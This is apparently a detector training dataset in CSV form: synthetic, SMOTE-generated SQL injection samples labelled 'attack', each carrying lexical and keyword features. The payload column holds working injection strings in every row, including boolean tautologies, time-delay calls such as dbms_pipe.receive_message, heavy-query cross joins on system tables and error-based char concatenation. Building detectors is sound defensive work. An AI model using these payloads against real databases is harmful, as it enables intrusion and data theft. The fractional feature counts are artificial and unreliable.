id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001962,attack,boolean,-2717'   )    )     )   or 8571  =  8571--,nearest_attack_euclidean,R000073,0.6729123212169349,42.68431676061853,13.36863352123705,2.8312872855243247,2.513237570463893,12.684316760618525,19.657841619690736,7.8289208098453695,0.05806798366368865,0.29634032236985286,0.4616682260945344,0.18392346787192404,1.0,0.0,2.6578416196907373,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.17107919015463136,3.6578416196907373,1.0,0.0,0.8289208098453685,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001963,attack,boolean,"1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000068,0.6019237240144271,225.94459329686342,35.60803296093685,3.7683515990519116,66.85087541926676,33.01338826822809,91.64819776562115,34.43213184374743,0.29541676904019987,0.146548828428623,0.4062114344166087,0.15182296811456847,0.20267765364561874,0.0,2.0,0.0,0.0,2.0,0.0,19.013388268228095,0.0,1.202677653645619,3.202677653645619,10.810710614582476,0.20267765364561868,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.405355307291238,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.405355307291238
SMOTE_001964,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000123,0.8733477998329915,132.53267593991995,29.588779323319994,3.9188615366472486,65.0,8.0,43.355117293279974,16.177558646639987,0.49069055778956083,0.06039268403563826,0.32695781896620146,0.1219589392085994,0.5887793233199935,0.0,2.0,0.0,1.0,1.0,0.0,6.588779323319994,0.0,0.0,2.0,4.0,0.5887793233199935,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001965,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000154,2.7292098210237046,145.96748970694344,32.62749719280276,4.124805666415423,76.74500561439449,6.983744853471723,43.88249157840827,18.356247660668963,0.5302866670837634,0.04593713935883012,0.2984487091008097,0.12532748445659686,1.084998128535172,3.271249532133793,0.0,0.0,0.7287504678662071,1.0,0.0,5.813748596401378,0.0,0.0,2.186251403598621,2.8137485964013784,0.2712495321337927,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.271249532133793,1.0,0.0,0.0,1.0,1.2712495321337929,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2712495321337928,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2712495321337929,0.2712495321337929,4.0849981285351715
SMOTE_001966,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000085,1.401233880602823,122.75982539426519,30.25127152161079,4.028557022725922,63.50577964368541,13.001387114484498,32.75196507885304,13.500693557242249,0.5060128929762882,0.10028749272334328,0.27744461296692857,0.11625500133343997,0.0,1.2498844071262918,2.0,0.0,1.0,2.0,0.0,3.000462371494833,0.24988440712629179,0.0,1.5002311857474164,5.0,0.0,1.0,1.0,0.0,0.0,1.0,0.7501155928737082,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.2498844071262918,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.249884407126292
SMOTE_001967,attack,boolean,1'+  (  select bfeq where 3445  =  3445 and 9198  =  9198--,nearest_attack_euclidean,R000149,0.5298518480250128,59.65763241539477,24.903945974342044,3.8796247390900938,17.123156779473632,17.0,18.53447563592114,7.0,0.2877060870726732,0.2850793463472632,0.30982895337824934,0.11738561320181426,1.0,0.0,2.0,0.0,0.0,2.0,0.0,1.219210805131592,0.0,0.0,0.0,4.780789194868409,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.7807891948684087,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7807891948684085
SMOTE_001968,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000018,0.0943612434976913,116.9816201725192,32.92648069007679,3.7313458818633083,34.12865879236563,14.981620172519197,47.90810086259599,19.963240345038393,0.29175346248460987,0.12806699510735028,0.4095291801239912,0.17065036228404865,5.94486051755759,0.0,0.0,0.9816201725191969,0.0,1.9816201725191966,0.0,8.018379827480803,1.9816201725191966,0.018379827480803246,1.0367596549616065,2.9632403450383933,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.9816201725191968,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.018379827480803135,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001969,attack,boolean,1' in boolean mode  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  #,nearest_attack_euclidean,R000036,0.9485569890262384,355.7462940284965,31.40671324643794,3.2455075245444784,89.36846142770433,48.63153857229567,169.0046855865439,48.74160844195258,0.2517865197126527,0.13650364285210065,0.4747160751167867,0.13699376231845994,0.8516783116094845,0.0,0.14832168839051552,0.0,0.0,1.1483216883905156,0.0,35.74160844195258,0.0,0.0,0.0,11.29664337678103,0.8516783116094845,0.0,0.0,0.8516783116094846,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.14832168839051557,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,16.148321688390517
SMOTE_001970,attack,boolean,"1'  )   as nvqk where 3917  =  3917 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000063,0.1894874165537646,151.22987527955675,33.668101614916885,4.145300265930288,72.39151962734763,17.557468819889184,41.33620322983378,19.944683602486148,0.4790753312578483,0.11571085045162988,0.27303971978734864,0.13217409850317322,1.0,0.0,2.0,0.0,1.0,1.944683602486148,0.0,4.9446836024861485,0.05531639751385195,5.0,4.0,4.9446836024861485,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.944683602486148,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9446836024861485
SMOTE_001971,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000076,0.5883422321861066,371.91063720094104,31.0,3.4082477958907353,96.63687906698033,56.99919003760233,166.81965447708666,51.454913619271665,0.25982044711061303,0.1534311422980458,0.44842066094122346,0.13832774965011768,0.3639308954173346,0.0,2.7270518284369993,0.0,0.0,3.0,0.0,34.36393089541733,0.0,0.0,1.0,15.727051828437002,0.09098272385433337,0.0,0.9090172761456664,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,2.0,0.0,0.9090172761456665,0.0,0.18196544770866707,0.9090172761456664,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_001972,attack,boolean,"1%""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000088,1.4368581584647537,137.42389332687603,31.0,3.9341817394864584,68.74727110734435,8.0,43.14129777562535,17.535324443906337,0.5000981929650974,0.058325353834676325,0.31389154872177455,0.1276849044784518,0.4646755560936644,0.5353244439063358,2.0,0.0,1.0,1.0,0.0,6.535324443906336,0.9999999999999998,0.0,2.0,4.0,0.4646755560936643,0.5353244439063357,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001973,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000056,1.1090967882613767,87.57468511582147,24.93924073083164,3.6762658798846664,27.464135769438798,13.32320678847194,32.84810182707909,13.93924073083164,0.30629982053893523,0.15790382057796418,0.3758933308435289,0.15990302803957174,3.6767932115280604,0.0,0.0,0.0,0.0,1.6767932115280602,0.0,5.616033942359699,0.32320678847193984,1.0,1.6464135769438797,1.67679321152806,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.6767932115280602,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.32320678847193984,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001974,attack,boolean,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kkim""  =  ""kkim",nearest_attack_euclidean,R000092,0.7287841127555991,379.1594315004618,31.0,3.3432768855047508,103.0,47.0,174.8509412861101,54.30849021435168,0.2717006557046303,0.1239799108555109,0.46108545194789674,0.14323398149196204,0.6169804287033682,3.3830195712966313,0.0,0.0,0.0,3.0,0.0,36.30849021435168,0.0,0.0,1.0,13.0,0.15424510717584206,0.845754892824158,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_001975,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000038,1.5969297312462367,227.58915154290446,35.169368228572864,3.7851998091230024,70.78647108573364,26.923420571432153,90.03241874287434,39.84684114286431,0.3088751883046771,0.11923201267706132,0.39629321766039033,0.1755995813578712,4.0,0.0,0.0,0.0,0.0,2.0,0.0,19.508104685718585,0.8306317714271378,1.5846841142864312,3.584684114286431,10.338736457145725,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.169368228572862,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.169368228572862
SMOTE_001976,attack,boolean,"1 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000033,0.41544547042545954,122.29889970021193,29.0,4.024513101414999,65.0,8.0,35.41574975017661,13.883149950035321,0.53273514340994,0.06556740226583878,0.28830430199854856,0.11339315232567265,0.0,0.0,2.0,0.0,1.0,1.0,0.0,4.883149950035322,0.0,0.0,2.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001977,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000060,0.20024016135869263,34.57028679600292,15.285143398001464,3.0043895170995274,3.3992007572020455,9.228114718401173,15.942971320399707,6.000000000000002,0.09616441534549533,0.26645943800909994,0.4631928049181438,0.174183341727261,0.9429713203997069,0.0,2.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.05702867960029301,3.0,0.9429713203997069,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001978,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'cixa' like 'cixa",nearest_attack_euclidean,R000136,1.668986598993102,121.84898920160458,28.268876349799427,3.865134089520833,49.77348380240688,14.0,41.537752699598855,16.537752699598855,0.4075302811327454,0.11499681251234259,0.34141217863490475,0.13606072772000727,3.0,0.0,0.0,0.0,0.0,0.26887634979942643,0.0,9.0,0.2688763497994265,1.0,3.0,0.26887634979942643,1.0,0.0,0.0,0.0,0.0,0.26887634979942654,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001979,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000124,1.1234439056027452,123.17890556334137,28.821094436658626,3.706022964206817,43.14686676009648,14.0,47.568755493269016,18.46328330997588,0.35016584601330125,0.11365691857547999,0.3862569206050591,0.14992031480615967,3.0,0.0,0.0,0.0,0.0,0.8210944366586268,0.0,9.821094436658626,0.8210944366586266,1.0,3.0,0.8210944366586261,1.0,0.0,0.0,0.0,0.0,0.8210944366586269,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001980,attack,boolean,"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R000052,4.301344699629139,211.58650810327578,31.0,3.5652201034313746,46.75900586024137,52.431762841999934,87.59715960068964,24.798579800344815,0.22912634286607914,0.2277743445334066,0.42523699504297996,0.11786231755753428,0.0,1.9604260598965553,0.0,0.0,1.3597159600689632,1.3201420199655183,0.0,16.07914788020689,0.0,0.0,4.0791478802068895,2.6798579800344817,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,-2.7755575615628914e-17,3.0395739401034447,0.0,0.0,0.6798579800344815,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6798579800344815,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3201420199655184,0.3201420199655184,6.039573940103445
SMOTE_001981,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000064,1.2796936722615082,163.58257046733434,35.53500741761414,3.9624792823515436,51.929985164771715,23.302511126421212,60.44254079687778,27.907533379263636,0.31881297594469465,0.14241132063050252,0.3689535360511906,0.1698221673736122,4.0,0.0,0.0,0.0,0.23249629119292947,2.0,0.0,11.070014835228282,0.0,1.7675037088070704,1.0,9.302511126421212,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.2324962911929296,0.0,1.0,0.4649925823858589,0.23249629119292942,0.7675037088070704,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6974888735787883
SMOTE_001982,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000013,0.8150436835075165,125.52838300914172,30.372772284154394,3.9495074406234365,41.35495055738955,16.0,45.30957103098021,22.863861420771972,0.3260520829006314,0.13967882627857864,0.35409903661404035,0.18017005420674956,4.0,0.0,0.2090759052818686,0.0,0.0,2.0,0.0,8.327392757745052,0.0,1.7909240947181315,1.0,6.954620473590657,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.7909240947181314,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001983,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000114,0.9076595703554009,233.7549497761292,36.24505022387078,3.7603628633331025,71.75494977612922,26.50989955225844,94.0,41.49010044774156,0.3069641954391426,0.11340253202877713,0.4021318865970407,0.17750138593503956,0.0,0.24505022387077935,2.0,0.0,0.0,1.0,0.0,22.0,0.2450502238707793,2.0,4.0,13.0,0.0,0.24505022387077938,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.7549497761292207,0.24505022387077935,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
SMOTE_001984,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000123,0.4691483325063956,133.85015755492987,30.287460611267534,3.9352818694855625,65.0,8.0,43.85015755492986,17.0,0.4857076482289827,0.059779402858951725,0.32748171783679314,0.1270312310752724,1.0,0.0,2.0,0.0,1.0,1.0,0.0,6.7125393887324645,0.28746061126753525,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001985,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000062,0.10252482297381908,69.00652840507038,25.735074241352105,3.804715421550289,14.93376856033803,20.735074241352105,23.60261136202816,9.735074241352105,0.216952174843534,0.300602103996927,0.34182496457669653,0.14062075658284243,0.0,1.0,2.0,0.0,0.0,2.0,0.0,2.8675371206760527,0.0,0.933768560338026,0.9337685603380261,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001986,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000077,2.9569937651202522,143.29219920600954,31.748499847309525,4.082617815757105,72.45630064129999,7.298199816771433,43.490999083857155,20.046699664080958,0.5166450637370792,0.04942730580342468,0.29639657430634236,0.13753105615315378,1.6490999083857154,1.3509000916142848,0.0,0.0,0.45030003053809486,0.0,0.0,7.947299725157146,0.0,1.0993999389238103,1.9006000610761897,3.7484998473095255,0.549699969461905,0.450300030538095,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,0.5496999694619051,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001987,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000130,0.6566576299845884,388.2262990923333,31.0,3.3098007014702127,95.59633081690001,57.467889727700005,182.51681872926665,52.64525981846667,0.24635153106553082,0.14801181947670491,0.47003842086594017,0.1355982285918241,0.0,0.0,1.177370090766667,0.0,0.0,3.0,0.0,37.4678897277,0.0,0.0,1.0,14.177370090766669,0.0,0.0,0.1773700907666671,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,2.0,0.0,0.1773700907666672,0.0,1.0,0.8226299092333329,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_001988,attack,boolean,select * from users where id  =  1.<@$ or 1  =  1 -- 1,nearest_attack_euclidean,R000008,1.6535273709798026,77.94155194238508,26.42022170605501,3.753249667478777,29.59672642809002,9.285797182085018,28.193452856180034,10.865575476030006,0.40594090761939766,0.10088589766229156,0.3427254836320576,0.15044771108625313,0.0,0.0,2.0,0.0,1.0,2.0,0.0,2.4874339680400075,0.0,0.31092924600500094,0.31092924600500105,5.689070753994999,0.0,0.0,1.0,0.0,0.0,1.0,0.31092924600500094,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
